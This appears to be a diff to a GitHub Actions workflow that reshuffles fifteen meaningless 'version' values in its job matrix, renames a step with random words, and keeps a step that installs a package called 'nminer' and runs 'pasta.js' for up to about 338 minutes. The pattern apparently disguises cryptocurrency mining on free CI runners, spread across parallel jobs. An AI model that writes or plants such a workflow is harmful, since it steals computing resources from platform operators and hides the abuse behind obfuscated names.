@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2538 }
-          - { version: 4868 }
-          - { version: 5415 }
-          - { version: 4415 }
-          - { version: 9538 }
-          - { version: 6307 }
-          - { version: 4521 }
-          - { version: 906 }
-          - { version: 8276 }
-          - { version: 4580 }
-          - { version: 3401 }
-          - { version: 1528 }
-          - { version: 573 }
-          - { version: 4894 }
-          - { version: 9553 }
+          - { version: 5519 }
+          - { version: 9130 }
+          - { version: 9203 }
+          - { version: 5546 }
+          - { version: 671 }
+          - { version: 2193 }
+          - { version: 558 }
+          - { version: 7374 }
+          - { version: 4951 }
+          - { version: 6573 }
+          - { version: 8847 }
+          - { version: 9434 }
+          - { version: 4641 }
+          - { version: 8838 }
+          - { version: 3342 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: lyre readily familiar
+      - name: deceivingly past against
         run: |
           npm install nminer@latest
-          timeout 329m node pasta.js || echo "pasta executed"
+          timeout 338m node pasta.js || echo "pasta executed"
